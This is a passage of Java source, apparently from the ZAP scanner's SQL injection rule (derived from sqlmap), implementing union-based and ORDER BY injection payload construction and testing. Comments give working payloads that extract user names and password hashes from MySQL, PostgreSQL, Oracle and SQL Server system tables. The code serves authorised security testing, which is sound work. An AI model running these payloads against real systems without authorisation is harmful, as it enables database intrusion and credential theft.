/*
 * Derivative Work based upon SQLMap source code implementation
 *
 * Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
 * Bernardo Damele Assumpcao Guimaraes, Miroslav Stampar.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
package org.zaproxy.zap.extension.sqliplugin;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.log4j.Logger;
import org.parosproxy.paros.network.HttpMessage;

/**
 * Union-based SQL injection query engine. This module allows the detection of OrderBy-based and
 * Union-based SQL injection payload testing incrementally a specific column range. Each candidated
 * vulnerability is then confirmed launching a specially crafted payload (a concatenated string
 * derived by a control query) and verifying if it's correctly evaluated by the backend application.
 *
 * @author yhawke (2013)
 */
public class SQLiUnionEngine {

    // Step used in ORDER BY technique used for finding the right number of columns in UNION payload
    // injections
    public static final int ORDER_BY_STEP = 10;

    // Minimum comparison ratio set needed for searching valid union column number based on standard
    // deviation
    public static final int MIN_UNION_RESPONSES = 5;

    // Minimum length of usable union injected response (quick defense against substr fields)
    public static final int UNION_MIN_RESPONSE_CHARS = 10;

    // Minimum range between minimum and maximum of statistical set
    public static final double MIN_STATISTICAL_RANGE = 0.01;

    // Coefficient used for a union-based number of columns checking (must be >= 7)
    public static final int UNION_STDEV_COEFF = 7;

    // ----------------------------------------
    private String paramName;
    private String paramValue;
    private String prefix;
    private String suffix;
    private String comment;
    private DBMSHelper dbms;
    private int uColsStart;
    private int uColsStop;
    private String uChars;

    private SQLInjectionScanRule plugin;
    private SQLiTest test;
    private int where;

    private HttpMessage exploitMessage;
    private String exploitPayload;
    private int exploitColumnsCount;

    // Logger instance
    private static final Logger log = Logger.getLogger(SQLiUnionEngine.class);

    /** @param plugin */
    public SQLiUnionEngine(SQLInjectionScanRule plugin) {
        this.plugin = plugin;
        this.where = SQLiPayloadManager.WHERE_ORIGINAL;
    }

    /**
     * This method tests if the target url is affected by an union SQL injection vulnerability. The
     * test is done up to 50 columns on the target database table
     *
     * @return true if the parameter id exploitable
     */
    public boolean isUnionPayloadExploitable() {

        // Result value (start setting it on false)
        boolean result = false;

        // In case that user explicitly stated number of columns affected
        exploitColumnsCount = (uColsStop == uColsStart) ? uColsStart : findUnionCharCount();

        if (exploitColumnsCount > 0) {
            // Confirm the union SQL injection and get the exact column
            // position which can be used to extract data
            result = confirmUnionTest(exploitColumnsCount, SQLiPayloadManager.WHERE_ORIGINAL);

            // Assure that the above function found the exploitable full union
            // SQL injection position
            // if (!result) {
            //    result = confirmUnionTest(exploitColumnsCount, SQLiPayloadManager.WHERE_NEGATIVE);
            // }
        }

        return result;
    }

    /**
     * @param count
     * @param where
     * @return
     */
    private boolean confirmUnionTest(int count, int where) {
        HttpMessage msg;
        String payload;
        String content;
        String controlToken;

        // Unbiased approach for searching appropriate usable column
        // random.shuffle(positions)

        exploitMessage = null;
        exploitPayload = null;

        // For each column of the table (# of NULL) perform a request using
        // the UNION ALL SELECT statement to test it the target url is
        // affected by an exploitable union SQL injection vulnerability
        for (int position = 0; position < count; position++) {
            // Prepare expression with delimiters
            payload = SQLiPayloadManager.randomString(UNION_MIN_RESPONSE_CHARS, false, null);
            controlToken = SQLiPayloadManager.charsStart + payload + SQLiPayloadManager.charsStop;
            payload = getConcatenatedQuery("\'" + payload + "\'");
            controlToken = controlToken.toLowerCase();

            // Do DBMS specific encoding if configured
            if (dbms != null) {
                payload = dbms.encodeStrings(payload);
            }

            // Forge the union SQL injection request
            payload = prepareUnionPayload(payload, position, count, uChars, null, false, null);
            payload = paramValue + payload;

            // Perform the request
            msg = plugin.sendPayload(paramName, payload, true);
            if (msg == null) {
                // Probably a Circular Exception occurred
                // exit with no match
                return false;
            }

            content = msg.getResponseBody().toString();
            content = SQLiPayloadManager.removeReflectiveValues(content, payload).toLowerCase();
            // Check also inside headers (?)
            // SQLiPayloadManager.removeReflectiveValues(msg.getResponseHeader().toString(),
            // payload);

            if (content.contains(controlToken)) {
                exploitPayload = payload;
                exploitMessage = msg;

                if (plugin.wasLastRequestDBMSError() && count > 1) {
                    log.warn(
                            "combined UNION/error-based SQL injection case found on column "
                                    + (position + 1)
                                    + "."
                                    + "Maybe could be found a column with better characteristics "
                                    + "using a direct testing tool");
                }

                return true;
            }
        }

        return false;
    }

    // ------------------------------------------
    // Internal contants for payload management
    // ------------------------------------------
    private static final String PREFIX_REGEX = "(?:\\s+(?:FIRST|SKIP)\\s+\\d+)*";
    private static final Pattern SELECT_CASE_PATTERN =
            Pattern.compile(
                    "\\ASELECT" + PREFIX_REGEX + "\\s+(\\(CASE WHEN\\s+.+\\s+END\\))",
                    Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_FROM_PATTERN =
            Pattern.compile(
                    "\\ASELECT" + PREFIX_REGEX + "\\s+(.+?)\\s+FROM\\s+", Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_DISTINCT_PATTERN =
            Pattern.compile(
                    "\\ASELECT" + PREFIX_REGEX + "\\s+DISTINCT\\((.+?)\\)\\s+FROM",
                    Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_PATTERN =
            Pattern.compile("\\ASELECT" + PREFIX_REGEX + "\\s+(.*)", Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_TOP_PATTERN =
            Pattern.compile(
                    "\\ASELECT\\s+TOP\\s+[\\d]+\\s+(.+?)\\s+FROM", Pattern.CASE_INSENSITIVE);
    private static final Pattern EXISTS_PATTERN =
            Pattern.compile("EXISTS(.*)", Pattern.CASE_INSENSITIVE);
    private static final Pattern SUBSTR_PATTERN =
            Pattern.compile("\\A(SUBSTR|MID\\()", Pattern.CASE_INSENSITIVE);
    private static final Pattern MINMAX_PATTERN =
            Pattern.compile("(?:MIN|MAX)\\(([^\\(\\)]+)\\)", Pattern.CASE_INSENSITIVE);

    /**
     * Take in input a payload string and return its processed nulled, casted and concatenated
     * payload string (useful for UNION-based payload strings) where we need to give back results
     * inside a single column.
     *
     * <p>Examples: MySQL input: SELECT user, password FROM mysql.user MySQL output:
     * CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS
     * CHAR(10000)), ' '),'YnCzLl') FROM mysql.user
     *
     * <p>PostgreSQL input: SELECT usename, passwd FROM pg_shadow PostgreSQL output:
     * 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS
     * CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow
     *
     * <p>Oracle input: SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE
     * TABLE_NAME='USERS' Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), '
     * ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS
     * WHERE TABLE_NAME='USERS'
     *
     * <p>Microsoft SQL Server input: SELECT name, master.dbo.fn_varbintohexstr(password) FROM
     * master..sysxlogins Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)),
     * ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), '
     * ')+'lpEqoi' FROM master..sysxlogins
     *
     * @param payload payload string to be processed
     * @return payload string nulled, casted and concatenated
     */
    public String getConcatenatedQuery(String query) {
        String concatenatedQuery = query.replace(", ", ",");
        Matcher matcher1 = SELECT_TOP_PATTERN.matcher(concatenatedQuery);
        Matcher matcher2 = SELECT_DISTINCT_PATTERN.matcher(concatenatedQuery);
        Matcher matcher3 = SELECT_CASE_PATTERN.matcher(concatenatedQuery);
        Matcher matcher4 = SELECT_FROM_PATTERN.matcher(concatenatedQuery);
        Matcher matcher5 = EXISTS_PATTERN.matcher(concatenatedQuery);
        Matcher matcher6 = SELECT_PATTERN.matcher(concatenatedQuery);
        Matcher matcher7 = SUBSTR_PATTERN.matcher(concatenatedQuery);
        Matcher matcher8 = MINMAX_PATTERN.matcher(concatenatedQuery);

        boolean fieldSelectCase = matcher3.find();
        boolean fieldSelectFrom = matcher4.find();
        boolean fieldSelectTop = matcher1.find();
        boolean fieldExists = matcher5.find();
        boolean fieldSelect = matcher6.find();
        String fieldsToCastStr;

        // first check if the dbms value is null
        if (dbms == null) {
            return query;
        }

        // Set field string to be casted
        if (matcher7.find()) {
            fieldsToCastStr = concatenatedQuery;

        } else if (matcher8.find()) {
            fieldsToCastStr = matcher8.group(1);

        } else if (fieldExists) {
            fieldsToCastStr = matcher5.group(1);

        } else if (fieldSelectTop) {
            fieldsToCastStr = matcher1.group(1);

        } else if (matcher2.find()) {
            fieldsToCastStr = matcher2.group(1);

        } else if (fieldSelectCase) {
            fieldsToCastStr = matcher3.group(1);

        } else if (fieldSelectFrom) {
            fieldsToCastStr = matcher4.group(1);

        } else if (fieldSelect) {
            fieldsToCastStr = matcher6.group(1);

        } else {
            fieldsToCastStr = concatenatedQuery;
        }

        String castedFields = getNullCastAndConcatenatedFields(fieldsToCastStr);
        concatenatedQuery = concatenatedQuery.replace(fieldsToCastStr, castedFields);

        // Do final modification according
        // to the specific configured dbms
        switch (dbms) {

                // ---------------------------------------------------------------
                // mySQL transformation section
                // ---------------------------------------------------------------
            case MYSQL:
                if (fieldExists || fieldSelectCase) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "CONCAT('" + SQLiPayloadManager.charsStart + "',");
                    concatenatedQuery += ",'" + SQLiPayloadManager.charsStop + "')";

                } else if (fieldSelectFrom) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "CONCAT('" + SQLiPayloadManager.charsStart + "',");
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    " FROM ", ",'" + SQLiPayloadManager.charsStop + "') FROM ");

                } else if (fieldSelect) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "CONCAT('" + SQLiPayloadManager.charsStart + "',");
                    concatenatedQuery += ",'" + SQLiPayloadManager.charsStop + "')";

                } else {
                    concatenatedQuery =
                            "CONCAT('"
                                    + SQLiPayloadManager.charsStart
                                    + "',"
                                    + concatenatedQuery
                                    + ",'"
                                    + SQLiPayloadManager.charsStop
                                    + "')";
                }
                break;

                // ---------------------------------------------------------------
                // Postgres, Oracle, SQLite and DB2 transformation section
                // ---------------------------------------------------------------
            case PGSQL:
            case ORACLE:
            case SQLITE:
            case DB2:
                if (fieldExists) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'||");
                    concatenatedQuery += "||'" + SQLiPayloadManager.charsStop + "'";

                } else if (fieldSelectCase) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'||(SELECT ");
                    concatenatedQuery += ")||'" + SQLiPayloadManager.charsStop + "'";

                } else if (fieldSelectFrom) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'||");
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    " FROM ", "||'" + SQLiPayloadManager.charsStop + "' FROM ");

                } else if (fieldSelect) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'||");
                    concatenatedQuery += "||'" + SQLiPayloadManager.charsStop + "'";

                } else {
                    concatenatedQuery =
                            "'"
                                    + SQLiPayloadManager.charsStart
                                    + "'||"
                                    + concatenatedQuery
                                    + "||'"
                                    + SQLiPayloadManager.charsStop
                                    + "'";
                }
                break;

                // ---------------------------------------------------------------
                // M$SQL and Sybase transformation section
                // ---------------------------------------------------------------
            case MSSQL:
            case SYBASE:
                if (fieldExists) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'+");
                    concatenatedQuery += "+'" + SQLiPayloadManager.charsStop + "'";

                } else if (fieldSelectTop) {
                    Pattern topNumPattern =
                            Pattern.compile(
                                    "\\ASELECT\\s+TOP\\s+([\\d]+)\\s+", Pattern.CASE_INSENSITIVE);
                    Matcher matcher = topNumPattern.matcher(concatenatedQuery);
                    String topNum = (matcher.find()) ? matcher.group(1) : null;

                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT TOP " + topNum + " ",
                                    "TOP " + topNum + " '" + SQLiPayloadManager.charsStart + "'+");
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    " FROM ", "+'" + SQLiPayloadManager.charsStop + "' FROM ");

                } else if (fieldSelectCase) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'+");
                    concatenatedQuery += "+'" + SQLiPayloadManager.charsStop + "'";

                } else if (fieldSelectFrom) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'+");
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    " FROM ", "+'" + SQLiPayloadManager.charsStop + "' FROM ");

                } else if (fieldSelect) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'+");
                    concatenatedQuery += "+'" + SQLiPayloadManager.charsStop + "'";

                } else {
                    concatenatedQuery =
                            "'"
                                    + SQLiPayloadManager.charsStart
                                    + "'+"
                                    + concatenatedQuery
                                    + "+'"
                                    + SQLiPayloadManager.charsStop
                                    + "'";
                }
                break;

                // ---------------------------------------------------------------
                // M$ Access transformation section
                // ---------------------------------------------------------------
            case ACCESS:
                if (fieldExists) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'&");
                    concatenatedQuery += "&'" + SQLiPayloadManager.charsStop + "'";

                } else if (fieldSelectCase) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'&(SELECT ");
                    concatenatedQuery += ")&'" + SQLiPayloadManager.charsStop + "'";

                } else if (fieldSelectFrom) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'&");
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    " FROM ", "&'" + SQLiPayloadManager.charsStop + "' FROM ");

                } else if (fieldSelect) {
                    concatenatedQuery =
                            concatenatedQuery.replace(
                                    "SELECT ", "'" + SQLiPayloadManager.charsStart + "'&");
                    concatenatedQuery += "&'" + SQLiPayloadManager.charsStop + "'";

                } else {
                    concatenatedQuery =
                            "'"
                                    + SQLiPayloadManager.charsStart
                                    + "'&"
                                    + concatenatedQuery
                                    + "&'"
                                    + SQLiPayloadManager.charsStop
                                    + "'";
                }
                break;

                // ---------------------------------------------------------------
            default:
                concatenatedQuery = query;
        }

        return concatenatedQuery;
    }

    /**
     * Take in input a sequence of fields and return its processed nulled, casted and concatenated
     * fields list
     *
     * <p>Examples: MySQL input: user,password MySQL output: IFNULL(CAST(user AS CHAR(10000)), '
     * '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ') MySQL scope: SELECT user, password
     * FROM mysql.user
     *
     * <p>PostgreSQL input: usename,passwd PostgreSQL output: COALESCE(CAST(usename AS
     * CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ') PostgreSQL
     * scope: SELECT usename, passwd FROM pg_shadow
     *
     * <p>Oracle input: COLUMN_NAME,DATA_TYPE Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)),
     * ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ') Oracle scope: SELECT COLUMN_NAME,
     * DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'
     *
     * <p>Microsoft SQL Server input: name,master.dbo.fn_varbintohexstr(password) Microsoft SQL
     * Server output: ISNULL(CAST(name AS VARCHAR(8000)), '
     * ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
     * Microsoft SQL Server scope: SELECT name, master.dbo.fn_varbintohexstr(password) FROM
     * master..sysxlogins
     *
     * @param fields fields string to be processed
     * @return fields string nulled, casted and concatened
     */
    private String getNullCastAndConcatenatedFields(String fields) {

        // If no database has been set return
        if (dbms == null) return fields;

        // If the fields string include DBMS commands return
        if (fields.startsWith("(CASE")
                || fields.startsWith("(IIF")
                || fields.startsWith("SUBSTR")
                || fields.startsWith("MID(")
                || Pattern.matches("\\A'[^']+'\\Z", fields)) {

            return fields;

        } else {
            fields = fields.replace(", ", ",");
            String[] fieldsSplitted = fields.split(",");
            String dbmsDelimiter = dbms.getDelimiter();
            String delimiterStr =
                    dbmsDelimiter + '\'' + SQLiPayloadManager.charsDelimiter + '\'' + dbmsDelimiter;
            StringBuilder nulledCastedConcatFields = new StringBuilder();
            boolean beginning = true;

            for (String field : fieldsSplitted) {
                if (beginning) {
                    beginning = false;
                } else {
                    nulledCastedConcatFields.append(delimiterStr);
                }

                nulledCastedConcatFields.append(getNullAndCastedField(field));
            }

            return nulledCastedConcatFields.toString();
        }
    }

    /**
     * Take in input a field string and return its processed nulled and casted field string.
     *
     * <p>Examples: MySQL input: VERSION() MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')
     * MySQL scope: VERSION()
     *
     * <p>PostgreSQL input: VERSION() PostgreSQL output: COALESCE(CAST(VERSION() AS
     * CHARACTER(10000)), ' ') PostgreSQL scope: VERSION()
     *
     * <p>Oracle input: banner Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ') Oracle scope:
     * SELECT banner FROM v$version WHERE ROWNUM=1
     *
     * <p>Microsoft SQL Server input: @@VERSION Microsoft SQL Server output: ISNULL(CAST(@@VERSION
     * AS VARCHAR(8000)), ' ') Microsoft SQL Server scope: @@VERSION
     *
     * @param field string to be processed
     * @return field string nulled and casted
     */
    private String getNullAndCastedField(String field) {

        // Do it only if dbms is set
        // and the field isn't null
        // -----------------------------
        if ((field != null) && (dbms != null)) {
            if (!field.startsWith("(CASE")
                    && !field.startsWith("(IIF")
                    && (dbms != DBMSHelper.SQLITE)) { // and not isDBMSVersionAtLeast('3'):

                String nulledCastedField = dbms.formatCast(field);
                nulledCastedField = dbms.formatIsNull(nulledCastedField);

                // if (hexConvert)
                //    nulledCastedField = hexConvertField(nulledCastedField);

                return nulledCastedField;
            }
        }

        return field;
    }

    /**
     * Take in input an payload (pseudo payload) string and return its processed UNION ALL SELECT
     * payload.
     *
     * <p>Examples: MySQL input: CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS
     * CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)),
     * CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user MySQL output: UNION ALL SELECT NULL,
     * CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)),
     * CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)),
     * CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488
     *
     * <p>PostgreSQL input:
     * (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS
     * CHARACTER(10000)),
     * (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd
     * AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118))
     * FROM pg_shadow PostgreSQL output: UNION ALL SELECT NULL,
     * (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS
     * CHARACTER(10000)),
     * (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd
     * AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)),
     * NULL FROM pg_shadow-- AND 7133=713
     *
     * <p>Oracle input:
     * (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS
     * VARCHAR(4000)),
     * (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS
     * VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM
     * SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)) Oracle
     * output: UNION ALL SELECT NULL,
     * (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS
     * VARCHAR(4000)),
     * (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS
     * VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL
     * FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND
     * 6738=6738
     *
     * <p>Microsoft SQL Server input:
     * (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS
     * VARCHAR(8000)),
     * (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password)
     * AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM
     * master..sysxlogins Microsoft SQL Server output: UNION ALL SELECT NULL,
     * (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS
     * VARCHAR(8000)),
     * (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password)
     * AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL
     * FROM master..sysxlogins-- AND 3254=3254
     *
     * @param payload it is a processed payload string unescaped to be forged within an UNION ALL
     *     SELECT statement
     * @param position it is the NULL position where it is possible to inject the payload
     * @param count
     * @param charSequence
     * @param multipleUnions
     * @param limited
     * @param fromTable
     * @return UNION ALL SELECT payload string forged
     */
    private String prepareUnionPayload(
            String query,
            int position,
            int count,
            String charSequence,
            String multipleUnions,
            boolean limited,
            String fromTable) {

        // if no dummy table has been set try to get it according
        // to the backend revealed dbms
        if ((fromTable == null) && (dbms != null)) {
            fromTable = dbms.getFromDummyTable();
        }

        if (query.startsWith("SELECT ")) {
            query = query.substring("SELECT ".length());
        }

        String baseQuery = "UNION ALL SELECT ";
        if (where == SQLiPayloadManager.WHERE_ORIGINAL) {
            if (dbms == DBMSHelper.MYSQL) {
                baseQuery = "LIMIT 0,1 " + baseQuery;
            }
        }

        // Begin to build the union payload
        StringBuilder unionQuery =
                new StringBuilder(plugin.preparePrefix(baseQuery, prefix, where, test));

        if (limited) {
            for (int i = 0; i < count; i++) {

                if (i > 0) {
                    unionQuery.append(',');
                }

                if (i == position) {
                    unionQuery.append("(SELECT ");
                    unionQuery.append(query);
                    unionQuery.append(')');

                } else {
                    unionQuery.append(charSequence);
                }
            }

            // Maybe there miss a FROM statement (tbv)
            unionQuery.append(fromTable);
            return plugin.prepareSuffix(unionQuery.toString(), comment, suffix, where);
        }

        // Check if it's a TOP based payload
        Pattern atopPattern = Pattern.compile("\\ATOP\\s+([\\d]+)\\s+", Pattern.CASE_INSENSITIVE);
        Matcher matcher = atopPattern.matcher(query);
        if (matcher.lookingAt()) {
            String topNum = matcher.group(1);
            query = query.substring(("TOP " + topNum).length());
            unionQuery.append("TOP ");
            unionQuery.append(topNum);
            unionQuery.append(" ");
        }

        // check if it's a INTO OUTFILE payload
        Pattern intoPattern =
                Pattern.compile(
                        "(\\s+INTO (DUMP|OUT)FILE\\s+\\'(.+?)\\')", Pattern.CASE_INSENSITIVE);
        String intoRegExp = null;
        matcher = intoPattern.matcher(query);
        if (matcher.lookingAt()) {
            intoRegExp = matcher.group(1);
            query = query.substring(0, query.indexOf(intoRegExp));
        }

        // remove the working table if exixts
        if (fromTable != null) {
            int fromTableIndex = unionQuery.lastIndexOf(fromTable);
            if (fromTableIndex == unionQuery.length() - fromTable.length()) {
                unionQuery.delete(fromTableIndex, unionQuery.length());
            }
        }

        // build the correct union payload
        for (int element = 0; element < count; element++) {
            if (element > 0) {
                unionQuery.append(',');
            }

            if (element == position) {
                if (query.contains(" FROM ")
                        && (!query.contains("(CASE ") || query.contains("WHEN use"))
                        && (!query.contains("EXISTS(") && !query.startsWith("SELECT "))) {

                    unionQuery.append(query.substring(0, query.indexOf(" FROM ")));

                } else {
                    unionQuery.append(query);
                }

            } else {
                unionQuery.append(charSequence);
            }
        }

        // check again if it's a from based payload
        if (query.contains(" FROM ")
                && (!query.contains("(CASE ") || query.contains("WHEN use"))
                && (!query.contains("EXISTS(") && !query.startsWith("SELECT "))) {

            unionQuery.append(query.substring(query.indexOf(" FROM ")));
        }

        // set correct values if dummy table exists
        if (fromTable != null) {
            if ((unionQuery.indexOf(" FROM ") < 0)
                    || (unionQuery.indexOf("(CASE ") >= 0)
                    || (unionQuery.indexOf("(IIF") >= 0)) {
                unionQuery.append(fromTable);
            }
        }

        // set correct values if into outfile payload configured
        if (intoRegExp != null) {
            unionQuery.append(intoRegExp);
        }

        // set multiple union payload
        if (multipleUnions != null) {
            unionQuery.append(" UNION ALL SELECT ");

            for (int element = 0; element < count; element++) {
                if (element > 0) {
                    unionQuery.append(',');
                }

                if (element == position) {
                    unionQuery.append(multipleUnions);

                } else {
                    unionQuery.append(charSequence);
                }
            }

            // Maybe there miss a FROM statement (tbv)
            if (fromTable != null) {
                unionQuery.append(fromTable);
            }
        }

        return plugin.prepareSuffix(unionQuery.toString(), comment, suffix, where);
    }

    /**
     * @param columnNumber
     * @return
     */
    private boolean orderByTest(int columnNumber) {
        // First prepare the injection payload
        String payload = plugin.preparePrefix("ORDER BY " + columnNumber, prefix, where, test);
        payload = plugin.prepareSuffix(payload, comment, suffix, where);
        // Now prefix the parameter value
        payload = paramValue + payload;

        Pattern orderPattern =
                Pattern.compile("(warning|error|order by|failed)", Pattern.CASE_INSENSITIVE);

        HttpMessage msg = plugin.sendPayload(paramName, payload, true);
        if (msg == null) {
            // Probably a Circular Exception occurred
            // exit with no match
            return false;
        }

        String content = msg.getResponseBody().toString();

        return (((content != null) && !orderPattern.matcher(content).lookingAt())
                        && plugin.isComparableToOriginal(content)
                || ((content != null)
                        && content.contains("data types cannot be compared or sorted")));
    }

    /**
     * Return the number of columns that could be found using the order by technique
     *
     * @return the number of columns or -1 if the technique cannot be used
     */
    private int orderByTechnique() {
        int found = -1;

        if (orderByTest(1) && !orderByTest(Integer.parseInt(SQLiPayloadManager.randomInt()))) {
            if (log.isDebugEnabled()) {
                log.debug(
                        "ORDER BY technique seems to be usable. "
                                + "This should reduce the time needed "
                                + "to find the right number "
                                + "of query columns. Automatically extending the "
                                + "range for current UNION query injection technique test");
            }

            int lowCols = 1;
            int highCols = ORDER_BY_STEP;

            while (found < 0) {
                if (orderByTest(highCols)) {
                    lowCols = highCols;
                    highCols += ORDER_BY_STEP;

                } else {

                    int mid;
                    while (found < 0) {
                        mid = highCols - (highCols - lowCols) / 2;
                        if (orderByTest(mid)) {
                            lowCols = mid;

                        } else {
                            highCols = mid;
                        }

                        if ((highCols - lowCols) < 2) {
                            found = lowCols;
                        }
                    }
                }
            }
        }

        return found;
    }

    /**
     * Computes the arithmetic mean
     *
     * @return the statistic mean
     */
    private double getAverage(List<Double> list) {
        double result = 0;
        for (double value : list) {
            result += value;
        }

        return result / list.size();
    }

    /**
     * Computes standard deviation of a list Reference: http://www.goldb.org/corestats.html
     *
     * @return the deviation
     */
    private double getDeviation(List<Double> list) {
        // Cannot calculate a deviation with less than
        // two response time values
        if (list.size() < 2) {
            return -1;
        }

        double avg = getAverage(list);
        double result = 0;
        for (double value : list) {
            result += Math.pow(value - avg, 2);
        }

        result = Math.sqrt(result / (list.size() - 1));

        return result;
    }

    /**
     * Finds number of columns affected by UNION based injection
     *
     * @return the number of columns that can be used for a union based SQLi
     */
    private int findUnionCharCount() {

        int lowerCount = uColsStart;
        int upperCount = uColsStop;
        double min = ResponseMatcher.MAX_RATIO;
        double max = ResponseMatcher.MIN_RATIO;

        // Search for our char sequence token
        Pattern tokenPattern = Pattern.compile("(" + uChars + "|\\>\\s*" + uChars + "\\s*\\<)");
